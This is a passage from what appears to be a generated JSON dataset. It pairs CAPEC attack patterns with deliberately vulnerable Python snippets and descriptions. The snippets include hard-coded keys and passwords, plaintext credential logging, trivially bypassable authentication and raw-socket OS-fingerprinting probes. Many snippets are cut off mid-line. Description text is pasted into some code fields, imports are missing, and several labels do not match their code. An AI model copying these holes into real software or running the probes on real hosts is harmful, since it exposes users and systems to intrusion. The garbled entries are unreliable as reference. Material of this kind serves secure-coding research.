        "code_snippet": "import random\nimport time\n\nclass PredictableSequenceGenerator:\n    def __init__(self):\n        # Using predictable seed based on system time\n        random.seed(int(time.time()))\n        self.sequence_base = 1000000\n    \n    def generate_sequence(self):\n        # Generate predictable sequence numbers for network packets\n        sequence = self.sequence_base + random.randint(0, 1000)\n        self.sequence_base += 1\n        return sequence\n\n    def get_system_info(self):\n        # Expose system information in error messages\n        try:\n            return f\"Sequence Generator Info:\\nBase: {self.sequence_base}\\nSeed Time: {time.time()}\\nSystem ID: {os.getpid()}\"\n        except Exception as e:\n            return str(e)\n\n# Usage\ngenerator = PredictableSequenceGenerator()\nfor _ in range(5):\n    print(generator.generate_sequence())",
        "description": "This code demonstrates a vulnerable sequence number generation system that uses predictable seeds and exposes system information. It uses system time as a seed for random number generation, making it predictable. The sequence numbers are generated with a simple incremental pattern, and the error handling exposes sensitive system information. The code lacks integrity checks and uses observable state (time and system information) to generate sequences, making it vulnerable to sequence prediction attacks."
    },
    {
        "capec_id": "325",
        "capec_name": "TCP Congestion Control Flag (ECN) Probe",
        "code_snippet": "import socket\nimport struct\n\ndef probe_ecn(target_host, target_port=80):\n    # Create raw socket\n    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    \n    # Set IP header flags for ECN\n    ip_header = struct.pack('!BBHHHBBH4s4s',\n        0x45,           # Version and IHL\n        0x01,           # Type of Service (ECN bits set)\n        0x0000,         # Total Length\n        0x1234,         # ID\n        0x0000,         # Flags and Fragment Offset\n        64,             # TTL\n        6,              # Protocol (TCP)\n        0,              # Checksum (initially 0)\n        socket.inet_aton('192.168.1.1'),  # Source IP\n        socket.inet_aton(target_host))     # Destination IP\n    \n    # Send probe and collect response\n    s.sendto(ip_header, (target_host, target_port))\n    response = s.recvfrom(4096)\n    \n    # Extract ECN flags from response\n    ecn_flags = response[0][1] & 0x03\n    os_fingerprint = 'Unknown'\n    \n    # Basic OS fingerprinting based on ECN response\n    if ecn_flags == 0x00:\n        os_fingerprint = 'Windows'\n    elif ecn_flags == 0x01:\n        os_fingerprint = 'Linux'\n    elif ecn_flags == 0x03:\n        os_fingerprint = 'BSD'\n        \n    return os_fingerprint",
        "description": "This code implements an OS fingerprinting technique using ECN (Explicit Congestion Notification) probing. It creates a raw socket and sends TCP packets with specific ECN flags set, then analyzes the response to determine the target operating system. The code is vulnerable as it exposes system information (CWE-200), lacks integrity checks (CWE-353), transmits data in cleartext (CWE-319), and could be used for network amplification attacks (CWE-406). The probe can also potentially reveal system alert handling mechanisms (CWE-1320)."
    },
    {
        "capec_id": "326",
        "capec_name": "TCP Initial Window Size Probe",
        "code_snippet": "\"\"\"\ndef probe_tcp_window_size(target_host, target_port):\n    import socket\n    \n    # Create raw socket for TCP connection\n    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    \n    # Buffer to store window size info (vulnerable to buffer overflow)\n    window_sizes = bytearray(256)\n    \n    try:\n        # Connect and get initial TCP window size\n        s.connect((target_host, target_port))\n        \n        # Dangerous: copying data without size check\n        raw_data = s.recv(1024)\n        window_sizes[0:len(raw_data)] = raw_data\n        \n        # Extract window size from TCP header (assumes specific memory layout)\n        window_size = int.from_bytes(window_sizes[14:16], byteorder='big')\n        \n        # Debug mode enabled (insecure)\n        if 'DEBUG' in globals():\n            print(f\"Raw TCP Header: {window_sizes[:20]",
        "description": "\"This code demonstrates vulnerable TCP window size probing used for OS fingerprinting. It contains multiple security issues: potential buffer overflow in window_sizes array, unsafe memory handling, exposed debug functionality, and reliance on specific TCP header memory layout assumptions. The code exposes sensitive system information through TCP window size analysis.\""
    },
    {
        "capec_id": "327",
        "capec_name": "TCP Options Probe",
        "code_snippet": "import socket\nimport struct\n\ndef create_custom_tcp_packet():\n    # Create raw socket\n    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    \n    # TCP Header with custom options\n    source = 12345\n    dest = 80\n    seq = 0\n    ack_seq = 0\n    window = socket.htons(5840)\n    \n    # TCP Options in specific order for OS fingerprinting\n    tcp_options = b'\\x02\\x04\\x05\\xb4'  # MSS\n    tcp_options += b'\\x01'  # NOP\n    tcp_options += b'\\x01'  # NOP\n    tcp_options += b'\\x04\\x02'  # SACK permitted\n    \n    # Create TCP header with specific options ordering\n    tcp_header = struct.pack('!HHLLBBHHH',\n        source, dest, seq, ack_seq,\n        (5 + len(tcp_options)//4) << 4,  # Data offset\n        0,  # Flags\n        window,\n        0,  # Checksum\n        0   # Urgent pointer\n    ) + tcp_options\n    \n    return tcp_header\n\ndef bind_multiple_ports():\n    # Vulnerable: Multiple bindings to same port\n    s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s1.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    s2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    s1.bind(('0.0.0.0', 8080))\n    s2.bind(('0.0.0.0', 8080))  # Same port binding",
        "description": "This code demonstrates OS fingerprinting through TCP header options manipulation and vulnerable socket binding. It creates custom TCP packets with specific option ordering that can reveal OS information, and implements multiple socket bindings to the same port. The code exposes system information through TCP headers and creates security vulnerabilities through port binding conflicts."
    },
    {
        "capec_id": "328",
        "capec_name": "TCP 'RST' Flag Checksum Probe",
        "code_snippet": "\"\"\"\nimport socket\nimport sys\n\ndef send_rst_packet(target_ip, target_port):\n    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    \n    # Create RST packet with sensitive error message in cleartext\n    error_message = f\"Connection failed - System: {sys.platform",
        "description": "\"This vulnerable code demonstrates OS fingerprinting through RST packets by including system information in cleartext within RST packet payloads. It lacks integrity checks, encryption, and proper validation, making it susceptible to information disclosure and replay attacks. The code both sends and receives RST packets with sensitive system information in their payloads without any security measures.\""
    },
    {
        "capec_id": "329",
        "capec_name": "ICMP Error Message Quoting Probe",
        "code_snippet": "import socket\nimport struct\n\ndef icmp_quote_scan(target_ip, source_port):\n    try:\n        # Create raw socket for ICMP\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        \n        # Craft UDP packet to trigger ICMP error\n        udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        udp_sock.sendto(b'SECRET_DATA_HERE', (target_ip, 12345))\n        \n        # Receive ICMP error response\n        while True:\n            data, addr = sock.recvfrom(4096)\n            ip_header = data[0:20]\n            icmp_header = data[20:28]\n            \n            # Extract quoted data from ICMP error message\n            quoted_data = data[28:]\n            \n            if addr[0] == target_ip:\n                print(f'Quoted data from {target_ip}: {quoted_data}')\n                break\n                \n    except socket.error as e:\n        print(f'Error details: {str(e)}')\n        system_info = socket.gethostbyname_ex(socket.gethostname())\n        print(f'System info: {system_info}')",
        "description": "This code demonstrates a vulnerable implementation that performs ICMP quote scanning and leaks sensitive information through error messages. It creates a raw socket to send and receive ICMP packets, attempts to trigger ICMP errors from a target system, and exposes system information in error messages. The code includes vulnerable practices such as revealing system details in error handling and not properly sanitizing quoted data from ICMP responses."
    },
    {
        "capec_id": "330",
        "capec_name": "ICMP Error Message Echoing Integrity Probe",
        "code_snippet": "\"\"\"\nimport socket\nimport struct\nimport time\n\ndef send_icmp_request(target_ip):\n    # Create raw socket for ICMP\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    \n    # ICMP Echo Request\n    icmp_type = 8\n    icmp_code = 0\n    icmp_checksum = 0\n    icmp_id = 12345\n    icmp_seq = 1\n    \n    # Create ICMP packet with sensitive data in payload\n    sensitive_data = f\\\"\\\"\\\"\n    Username: admin\n    Password: secret123\n    Server: internal.local\n    DB_Connection: mysql://root:pass@localhost/prod\n    \\\"\\\"\\\"\n    \n    # Pack ICMP header without proper validation\n    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, \n                            icmp_checksum, icmp_id, icmp_seq)\n    \n    # Send packet and store response without verification\n    packet = icmp_header + sensitive_data.encode()\n    sock.sendto(packet, (target_ip, 0))\n    \n    # Wait for response without timeout\n    while True:\n        response, addr = sock.recvfrom(1024)\n        # Process response without checking integrity\n        print(f\\\"Received response from {addr",
        "description": "\"This vulnerable code demonstrates ICMP error message analysis with multiple security flaws. It includes sensitive information in ICMP payloads, lacks proper message integrity checks, doesn't validate responses, and writes unsanitized data to logs. It's susceptible to capture-replay attacks and information disclosure through error messages. The code creates raw ICMP packets with sensitive data and processes responses without proper validation or authentication.\""
    },
    {
        "capec_id": "331",
        "capec_name": "ICMP IP Total Length Field Probe",
        "code_snippet": "import socket\nimport struct\n\ndef send_udp_probe(target_ip, target_port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.settimeout(2)\n    \n    # Create a UDP packet without any integrity checks\n    message = b'PROBE'\n    sock.sendto(message, (target_ip, target_port))\n    \n    try:\n        # Wait for ICMP Port Unreachable response\n        while True:\n            data, addr = sock.recvfrom(4096)\n            # Extract IP header total length from response\n            ip_header = struct.unpack('!BBHHHBBH4s4s', data[:20])\n            total_length = ip_header[2]\n            \n            # Store OS fingerprint based on response\n            fingerprint = {\n                'ip_total_length': total_length,\n                'raw_response': data\n            }\n            return fingerprint\n    except socket.timeout:\n        return None\n    finally:\n        sock.close()",
        "description": "This vulnerable code sends UDP probes to closed ports and analyzes ICMP responses for OS fingerprinting. It exhibits multiple vulnerabilities: transmits data without integrity checks, processes length fields without validation, exposes system information through error messages, and handles responses in cleartext. The code could allow attackers to gather system information through response analysis and potentially manipulate packet contents due to lack of message integrity verification."
    },
    {
        "capec_id": "332",
        "capec_name": "ICMP IP 'ID' Field Error Message Probe",
        "code_snippet": "import socket\nimport struct\n\ndef fingerprint_os(target_ip):\n    # Create raw socket for UDP\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    \n    # Set a specific ID in the IP header\n    IPID = 12345\n    \n    # Send UDP packet to a closed port (9999)\n    port = 9999\n    payload = b'Probe packet'\n    \n    try:\n        sock.sendto(payload, (target_ip, port))\n        \n        # Create raw socket to receive ICMP error response\n        icmp_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        icmp_sock.settimeout(2)\n        \n        # Receive and analyze ICMP response\n        data, addr = icmp_sock.recvfrom(1024)\n        ip_header = data[20:40]\n        type_code = struct.unpack('!BB', data[20:22])\n        \n        # Extract OS fingerprint from response\n        return {\n            'ICMP_type': type_code[0],\n            'ICMP_code': type_code[1],\n            'Original_IPID': IPID,\n            'Response_Data': data.hex()\n        }\n    \n    finally:\n        sock.close()\n        icmp_sock.close()",
        "description": "This code demonstrates a vulnerable OS fingerprinting technique by sending specifically crafted UDP packets and analyzing ICMP error responses. It reveals system information through error messages (CWE-211), transmits data in cleartext (CWE-319), and exposes system behavior through response discrepancies (CWE-204). The code sends UDP datagrams with specific IP IDs to closed ports and captures the resulting ICMP error messages to fingerprint the target operating system."
    },
    {
        "capec_id": "383",
        "capec_name": "Harvesting Information via API Event Monitoring",
        "code_snippet": "\"\"\"\nimport socket\nimport threading\nimport json\n\nclass VirtualEvent:\n    def __init__(self):\n        self.participants = {",
        "description": "\"This vulnerable code creates a virtual event server that accepts participant connections, stores user information in plaintext, and broadcasts event details including participant information without encryption. It demonstrates multiple security issues including cleartext transmission of sensitive data, lack of encryption, unprotected communication channel, and exposure of participant information through unsecured data queries.\""
    },
    {
        "capec_id": "384",
        "capec_name": "Application API Message Manipulation via Man-in-the-Middle",
        "code_snippet": "\"\"\"\nclass MessageProcessor:\n    def __init__(self):\n        self.trusted_clients = ['client1', 'client2']\n        self.message_queue = {",
        "description": "\"This vulnerable code demonstrates a message processing system that fails to properly validate message authenticity, relies on client-side security controls, and transmits sensitive data without encryption. It trusts client-supplied privilege levels and allows modification of assumed-immutable data without proper verification.\""
    },
    {
        "capec_id": "385",
        "capec_name": "Transaction or Event Tampering via Application API Manipulation",
        "code_snippet": "\"\"\"\nclass GameExchange:\n    def __init__(self):\n        self.inventory = {",
        "description": "\"This code demonstrates a vulnerable game exchange system that fails to properly validate trade authenticity, lacks encryption for sensitive transaction data, trusts client-side data without verification, and doesn't protect against data tampering during transmission. It allows attackers to modify transaction details mid-exchange and manipulate game item trades.\""
    },
    {
        "capec_id": "386",
        "capec_name": "Application API Navigation Remapping",
        "code_snippet": "\"\"\"\nclass WebFramework:\n    def __init__(self):\n        self.user_links = {",
        "description": "\"A vulnerable web framework implementation that allows attackers to manipulate link destinations and content through insufficient validation of user input, lack of origin verification, and client-side security enforcement. The code demonstrates how an attacker could inject malicious redirect URLs into image galleries, potentially leading to phishing attacks or click fraud.\""
    },
    {
        "capec_id": "387",
        "capec_name": "Navigation Remapping To Propagate Malicious Content",
        "code_snippet": "\"\"\"\nclass MessageSystem:\n    def __init__(self):\n        self.message_queue = []\n        self.is_admin = False\n\n    def send_message(self, message, signature):\n        # Vulnerable: Client-side only validation of message authenticity\n        if self._verify_signature_client_side(signature):\n            # Vulnerable: No encryption of sensitive data in transmission\n            self.message_queue.append({\n                'content': message,\n                'is_admin_message': self.is_admin,\n                'verified': True",
        "description": "\"This code demonstrates multiple vulnerabilities related to client-side data manipulation and insufficient verification. It relies on client-side validation for message authenticity, doesn't encrypt sensitive data, and trusts client-provided admin status flags. An attacker could modify the message data or bypass the signature verification to execute unauthorized admin commands.\""
    },
    {
        "capec_id": "388",
        "capec_name": "Application API Button Hijacking",
        "code_snippet": "\"\"\"\nclass ButtonManager:\n    def __init__(self):\n        self.button_config = {",
        "description": "\"This code demonstrates a vulnerable button management system where button destinations can be manipulated both during transmission and on the client side. The code lacks origin validation, proper data authenticity verification, and encryption of sensitive configuration data. Button destinations are stored in plain text and can be modified by an attacker, either through intercepting the configuration data or by client-side manipulation.\""
    },
    {
        "capec_id": "389",
        "capec_name": "Content Spoofing Via Application API Manipulation",
        "code_snippet": "\"\"\"\nimport socket\nimport json\n\nclass InsecureMessageFramework:\n    def __init__(self):\n        self.client_auth_token = 'default_token'\n        \n    def send_message(self, message, destination):\n        # No integrity checks on message content\n        payload = {\n            'content': message,\n            'auth_token': self.client_auth_token,\n            'destination': destination",
        "description": "\"This code demonstrates multiple security vulnerabilities including lack of message integrity checks, client-side only authentication, no protection against replay attacks, and susceptibility to message spoofing. It implements an insecure message framework that relies solely on client-side security measures and lacks proper server-side validation.\""
    },
    {
        "capec_id": "390",
        "capec_name": "Bypassing Physical Security",
        "code_snippet": "\"\"\"\nclass PhysicalSecuritySystem:\n    def __init__(self):\n        self.alarm_active = True\n        self.voltage_threshold = 3.3\n        self.current_voltage = 3.3\n        self.em_sensor_active = True\n        \n    def check_card_access(self, card_id):\n        # Vulnerable: No protection against voltage glitching\n        if self.current_voltage < self.voltage_threshold:\n            return True  # Access control bypassed due to voltage drop\n            \n        # Vulnerable: No EMI protection\n        if not self.em_sensor_active:\n            return True  # Access control bypassed due to EMI\n            \n        return self.validate_card(card_id)\n    \n    def send_alert(self, message):\n        # Vulnerable: Alert signals can be suppressed\n        if self.alarm_active:\n            try:\n                self._send_alert_signal(message)\n            except Exception:\n                pass  # Silent failure of alert system\n                \n    def validate_card(self, card_id):\n        # Vulnerable: No protection against timing analysis\n        if card_id.startswith('ADMIN'):\n            time.sleep(0.1)  # Timing side-channel leak\n            return True\n        return False\"\"\",\n    \"description\": \"This code demonstrates a vulnerable physical security system implementation that is susceptible to voltage glitching attacks, electromagnetic interference, timing side-channel analysis, and alert signal suppression. The system lacks proper protection mechanisms against physical tampering and does not implement sufficient safeguards for its security-critical operations.\"",
        "description": "\"This code demonstrates a vulnerable physical security system implementation that is susceptible to voltage glitching attacks, electromagnetic interference, timing side-channel analysis, and alert signal suppression. The system lacks proper protection mechanisms against physical tampering and does not implement sufficient safeguards for its security-critical operations.\""
    },
    {
        "capec_id": "391",
        "capec_name": "Bypassing Physical Locks",
        "code_snippet": "\"\"\"\nclass PhysicalSecuritySystem:\n    def __init__(self):\n        self.lock_bit = False\n        self.debug_mode = False\n        self.lock_status = 'locked'\n        self.protected_registers = {\n            'config': 0x1000,\n            'access_control': 0x2000,\n            'user_data': 0x3000",
        "description": "\"A vulnerable implementation of a physical security system that demonstrates multiple security weaknesses including modifiable lock bits, debug mode bypasses, insufficient register protection, and externally controllable locks. The code allows unauthorized modification of security controls and bypassing of access restrictions through debug modes and unprotected lock bits.\""
    },
    {
        "capec_id": "392",
        "capec_name": "Lock Bumping",
        "code_snippet": "\"\"\"\nclass LockSystem:\n    def __init__(self):\n        self.lock_bit = False\n        self.MASTER_KEY = \\\"DEADBEEF\\\"  # Hard-coded master key\n        self.failed_attempts = 0\n        self.MAX_ATTEMPTS = 3\n        self.registers = {\n            \\\"config\\\": 0x1234,\n            \\\"security\\\": 0x5678,\n            \\\"access_control\\\": 0x9ABC",
        "description": "\"This vulnerable code simulates a lock system with multiple security flaws: it uses a hard-coded master key, loses lock bit protection after power state transitions, implements an overly restrictive lockout mechanism, and allows bypass of register protection. The code demonstrates how an attacker could potentially 'bump' the security mechanisms through various vulnerabilities, similar to physical lock bumping.\""
    },
    {
        "capec_id": "393",
        "capec_name": "Lock Picking",
        "code_snippet": "\"\"\"\nclass LockManager:\n    def __init__(self):\n        self.lock_bit = False\n        self.protected_registers = {",
        "description": "\"This code represents a vulnerable lock management system that demonstrates multiple security issues related to lock manipulation. It includes flaws such as modifiable lock bits, inadequate register protection granularity, improper lock state verification, and potential deadlock scenarios. The code mimics a hardware-level lock system but with security vulnerabilities that could allow unauthorized access and manipulation.\""
    },
    {
        "capec_id": "394",
        "capec_name": "Using a Snap Gun Lock to Force a Lock",
        "code_snippet": "import threading\nimport time\n\nclass ElectronicLock:\n    def __init__(self):\n        self._lock_state = False\n        self._control_register = 0x00\n        self._lock_bit = False\n        self._default_key = b'0123456789abcdef'  # Default crypto key\n        self._lock = threading.Lock()\n\n    def set_lock_bit(self):\n        self._lock_bit = True\n\n    def power_state_transition(self):\n        # Vulnerability: Lock bit protection is lost after power transition\n        self._lock_bit = False\n        self._control_register = 0x00\n\n    def modify_control_register(self, value):\n        with self._lock:\n            if not self._lock_bit:\n                self._control_register = value\n                # Deadlock potential: Second thread waiting for lock\n                time.sleep(1)\n                return True\n        return False\n\n    def force_lock(self):\n        # Simulates snap gun attack by bypassing lock bit\n        if not self._lock_bit:\n            self._control_register = 0xFF\n            self._lock_state = False\n            return True\n        return False",
        "description": "This vulnerable code simulates an electronic lock system with multiple security flaws: it uses a default cryptographic key, has improper lock bit protection that can be bypassed after power state transitions, potential deadlocks in threaded operations, and insufficient protection of control registers. The force_lock() method simulates the CAPEC's physical lock picking concept in software form by allowing bypass of security controls when lock bits are not properly set."
    },
    {
        "capec_id": "395",
        "capec_name": "Bypassing Electronic Locks and Access Controls",
        "code_snippet": "\"\"\"\nclass ElectronicAccessControl:\n    def __init__(self):\n        self.MASTER_KEY = b'5up3rS3cr3tK3y123'  # Hard-coded crypto key\n        self.authorized_cards = {",
        "description": "\"A vulnerable electronic access control system implementation that uses hard-coded cryptographic keys, outdated encryption (DES), and lacks protection against physical attacks. The code is susceptible to card cloning, side-channel analysis, and electromagnetic fault injection attacks.\""
    },
    {
        "capec_id": "396",
        "capec_name": "DEPRECATED: Bypassing Card or Badge-Based Systems",
        "code_snippet": "class PaymentSystem:\n    def __init__(self):\n        self.transactions = []\n\n    def process_card_payment(self, card_data, amount):\n        # Weak encryption using easily breakable method\n        encrypted_data = self.weak_encrypt(card_data)\n        \n        # No verification of card authenticity\n        # No protection against replay attacks\n        if encrypted_data in self.transactions:\n            return True\n        \n        # Store transaction for future reference\n        self.transactions.append(encrypted_data)\n        return True\n        \n    def weak_encrypt(self, data):\n        # Using simple XOR operation - very weak encryption\n        key = 'secret123'\n        return ''.join(chr(ord(a) ^ ord(b)) for a, b in zip(data, key * len(data)))\n\n    def verify_rfid(self, rfid_data):\n        # No validation of RFID data authenticity\n        # Accepts any well-formed data without verification\n        return True if len(rfid_data) == 16 else False",
        "description": "This code demonstrates multiple authentication vulnerabilities including weak cryptography (CWE-327), authentication bypass through spoofing (CWE-290), and capture-replay vulnerabilities (CWE-294). It implements a payment system that fails to properly validate card/RFID data, uses weak encryption, and is susceptible to replay attacks by storing and accepting previously seen transactions without proper verification."
    },
    {
        "capec_id": "397",
        "capec_name": "Cloning Magnetic Strip Cards",
        "code_snippet": "\"\"\"\nclass MagneticCardData(Cloneable):\n    def __init__(self, card_number, pin, access_code):\n        self.card_number = card_number\n        self.pin = pin\n        self.access_code = access_code\n        self._encryption_key = 'weak_static_key'  # Weak encryption\n    \n    def encode_data(self):\n        # Using weak encoding (simple XOR)\n        encoded = ''\n        for char in f'{self.card_number",
        "description": "\"This code demonstrates vulnerable magnetic card handling by implementing a cloneable class that stores sensitive card data with weak encryption, no authentication, and easy duplication capabilities. The code uses insecure practices such as static encryption keys, simple XOR encoding, and unrestricted cloning functionality, making it susceptible to unauthorized card duplication attacks.\""
    },
    {
        "capec_id": "398",
        "capec_name": "Magnetic Strip Card Brute Force Attacks",
        "code_snippet": "\"\"\"\nimport hashlib\n\nclass MagneticCardSystem:\n    def __init__(self):\n        self.secret_key = b'1234567890abcdef'  # Hard-coded key\n        self.failed_attempts = {",
        "description": "\"This vulnerable code demonstrates a magnetic card system with multiple security flaws: using a hard-coded cryptographic key, weak MD5 hashing, no rate limiting for authentication attempts, susceptibility to card cloning, and lack of proper authentication mechanisms to prevent spoofing. The system doesn't implement proper security measures against electromagnetic attacks or brute force attempts.\""
    },
    {
        "capec_id": "399",
        "capec_name": "Cloning RFID Cards or Chips",
        "code_snippet": "class RFIDReader:\n    def __init__(self):\n        self.authorized_tags = {}\n\n    def register_tag(self, tag_id, access_level):\n        # Weak implementation: tag IDs can be duplicated\n        self.authorized_tags[tag_id] = access_level\n\n    def validate_tag(self, tag_signal):\n        # Vulnerable: No cryptographic protection or challenge-response\n        tag_id = self.decode_signal(tag_signal)\n        return self.authorized_tags.get(tag_id, 'unauthorized')\n\n    def decode_signal(self, signal):\n        # Vulnerable: Simple decoding without verification\n        return signal.strip().lower()\n\n# Usage example\nreader = RFIDReader()\nreader.register_tag('employee123', 'building_access')\n\n# Attacker can easily clone the signal\noriginal_signal = 'EMPLOYEE123'\ncloned_signal = original_signal\n\n# Both signals grant access\nprint(reader.validate_tag(original_signal))\nprint(reader.validate_tag(cloned_signal))",
        "description": "This code demonstrates a vulnerable RFID system implementation that allows for tag cloning. The system lacks proper cryptographic protection, signal verification, and challenge-response mechanisms. It uses simple string-based identifiers that can be easily duplicated, and the decoding mechanism is basic without any security checks. The system also doesn't implement protection against replay attacks or electromagnetic interference, making it susceptible to cloning attacks."
    },
    {
        "capec_id": "400",
        "capec_name": "RFID Chip Deactivation or Destruction",
        "code_snippet": "\"\"\"\nimport serial\nimport time\n\nclass RFIDController:\n    def __init__(self, port='/dev/ttyUSB0'):\n        self.serial_port = serial.Serial(port, 9600)\n        self.debug_mode = True  # Debug interface enabled by default\n        self.error_counter = 0\n        \n    def send_command(self, command, bypass_check=False):\n        if not bypass_check and not self.verify_access():\n            return False\n        self.serial_port.write(command.encode())\n        \n    def deactivate_tag(self, tag_id):\n        # No authentication check for deactivation\n        deactivation_command = f'KILL {tag_id",
        "description": "\"Vulnerable RFID controller implementation that allows unauthorized deactivation of tags, contains weak access controls for debug interface, improper error handling, insufficient data scrubbing, and weak security identifier verification. The code demonstrates multiple security weaknesses that could be exploited to compromise RFID tag functionality.\""
    },
    {
        "capec_id": "401",
        "capec_name": "Physically Hacking Hardware",
        "code_snippet": "class HardwareController:\n    def __init__(self):\n        self.debug_mode = False\n        self.access_level = 0\n        self.clock_speed = 1000\n        self.voltage = 3.3\n\n    def modify_hardware(self, component_id, new_settings):\n        # No authentication check for physical access\n        if component_id in self.hardware_components:\n            self.hardware_components[component_id] = new_settings\n            return True\n\n    def enable_debug_mode(self):\n        # No verification of authorization\n        self.debug_mode = True\n        return \"Debug mode enabled\"\n\n    def set_clock_speed(self, speed):\n        # No protection against clock glitching\n        self.clock_speed = speed\n        return f\"Clock speed set to {speed}\"\n\n    def modify_voltage(self, new_voltage):\n        # No voltage glitch detection\n        self.voltage = new_voltage\n        return True\n\n    def read_sensitive_data(self):\n        # No protection against side-channel analysis\n        if self.debug_mode:\n            return self._get_encrypted_data()",
        "description": "This vulnerable code demonstrates a hardware control interface with multiple security flaws: lack of physical access control verification, unprotected debug mode activation, no protection against voltage/clock glitching, and susceptibility to side-channel attacks. The code allows unrestricted modification of hardware components and sensitive data access without proper authentication or protective measures."
    },
    {
        "capec_id": "402",
        "capec_name": "Bypassing ATA Password Security",
        "code_snippet": "\"\"\"\nclass DiskController:\n    def __init__(self):\n        self.master_password = 'admin123'  # Hard-coded master password\n        self.is_locked = True\n    \n    def update_password(self, new_password):\n        # Missing authentication check before password update\n        self.master_password = new_password\n        return True\n    \n    def access_drive(self, password):\n        # Weak authorization - doesn't verify if system has proper ATA security\n        if password == self.master_password or not self.is_locked:\n            return \"Access granted to drive contents\"\n        return \"Access denied\"\n    \n    def hot_swap_bypass(self):\n        # Simulates installing drive in system without ATA security\n        self.is_locked = False\n        return \"Drive unlocked via hot swap\"\n\n# Usage example\ndrive = DiskController()\ndrive.hot_swap_bypass()  # Bypasses security\ndrive.update_password(\"newpass\")  # Changes password without authorization\n\"\"\",\n    \"description\": \"This code demonstrates vulnerable ATA security implementation with hard-coded credentials, insufficient authorization checks, and the ability to bypass security through hot-swapping. The code allows password updates without proper authentication and contains a master password in plaintext. It also simulates the vulnerability of moving a drive to a system without ATA security features.\"",
        "description": "\"This code demonstrates vulnerable ATA security implementation with hard-coded credentials, insufficient authorization checks, and the ability to bypass security through hot-swapping. The code allows password updates without proper authentication and contains a master password in plaintext. It also simulates the vulnerability of moving a drive to a system without ATA security features.\""
    },
    {
        "capec_id": "404",
        "capec_name": "DEPRECATED: Social Information Gathering Attacks",
        "code_snippet": "def authenticate_user(username, password):\n    # Insecure use of DNS for authentication\n    try:\n        domain = f'{username}.trusted-domain.com'\n        dns_result = socket.gethostbyname(domain)\n        \n        # Store sensitive data in plaintext log\n        with open('server.log', 'a') as log:\n            log.write(f'Login attempt: {username}:{password} from {dns_result}\\n')\n        \n        # Insecure data storage without encryption\n        user_data = {\n            'username': username,\n            'password': password,\n            'last_login': time.time()\n        }\n        with open('users.dat', 'w') as f:\n            json.dump(user_data, f)\n            \n        return True if dns_result else False\n    except:\n        return False",
        "description": "This vulnerable code demonstrates multiple deprecated security issues including reliance on DNS lookups for security decisions, failure to protect stored data, improper authentication mechanisms, and exposure of sensitive information through log files. The code stores credentials in plaintext, uses DNS for authentication, and logs sensitive information without proper controls."
    },
    {
        "capec_id": "405",
        "capec_name": "DEPRECATED: Social Information Gathering via Research",
        "code_snippet": "def authenticate_user(username, password):\n    # Vulnerable authentication logic using DNS lookup\n    try:\n        dns_result = socket.gethostbyname(f'{username}.trusted-domain.com')\n        if dns_result:\n            with open('server.log', 'a') as log:\n                log.write(f'User login attempt: {username}:{password}\\n')\n            \n            user_data = {\n                'username': username,\n                'password': password,\n                'credit_card': '1234-5678-9012-3456'\n            }\n            \n            # Store sensitive data in plaintext\n            with open('user_data.txt', 'w') as f:\n                f.write(str(user_data))\n            \n            return True\n    except:\n        return False",
        "description": "This code demonstrates multiple security vulnerabilities including reliance on DNS lookups for security decisions, improper authentication mechanisms, exposure of sensitive information in log files, and failure to protect stored data through plaintext storage of credentials and sensitive information."
    },
    {
        "capec_id": "406",
        "capec_name": "Dumpster Diving",
        "code_snippet": "class SensitiveDataHandler:\n    def __init__(self):\n        self.user_data = {}\n        self.temp_files = []\n\n    def process_user_info(self, user_id, credit_card, ssn, password):\n        # Store sensitive data in plaintext\n        self.user_data[user_id] = {\n            'cc': credit_card,\n            'ssn': ssn,\n            'pwd': password\n        }\n        \n        # Write sensitive data to temporary files without encryption\n        with open(f'temp_{user_id}.txt', 'w') as f:\n            f.write(f'Credit Card: {credit_card}\\n')\n            f.write(f'SSN: {ssn}\\n')\n            f.write(f'Password: {password}\\n')\n        self.temp_files.append(f'temp_{user_id}.txt')\n\n    def cleanup(self):\n        # Improper cleanup - just delete file references without secure deletion\n        for file in self.temp_files:\n            if os.path.exists(file):\n                os.remove(file)\n        self.temp_files = []\n        # Memory still contains sensitive data\n        self.user_data = {}",
        "description": "This vulnerable code demonstrates multiple insecure practices related to handling sensitive data. It stores sensitive information (credit cards, SSNs, passwords) in plaintext both in memory and in temporary files. The cleanup process simply deletes file references without secure data wiping, leaving sensitive data potentially recoverable through dumpster diving or memory inspection. The code lacks proper data encryption, secure file handling, and proper data sanitization during decommissioning."
    },
    {
        "capec_id": "407",
        "capec_name": "Pretexting",
        "code_snippet": "class UserSession:\n    def __init__(self):\n        self.sessions = {}\n\n    def create_session(self, session_id, user_data):\n        # Vulnerable: Does not invalidate existing sessions\n        self.sessions[session_id] = user_data\n\n    def authenticate_user(self, username, password):\n        # Pretexting vulnerability: No proper verification of identity\n        if 'admin_override' in self.sessions:\n            return True\n\n        return self.check_credentials(username, password)\n\n    def display_sensitive_info(self, user_id):\n        # UI Misrepresentation: No verification of source\n        sensitive_data = {\n            'ssn': '123-45-6789',\n            'credit_card': '4111-1111-1111-1111',\n            'bank_account': '9876543210'\n        }\n        return sensitive_data\n\n    def handle_user_request(self, request_data):\n        # Channel vulnerability: No proper endpoint verification\n        if 'trusted_source' in request_data:\n            return self.display_sensitive_info(request_data['user_id'])",
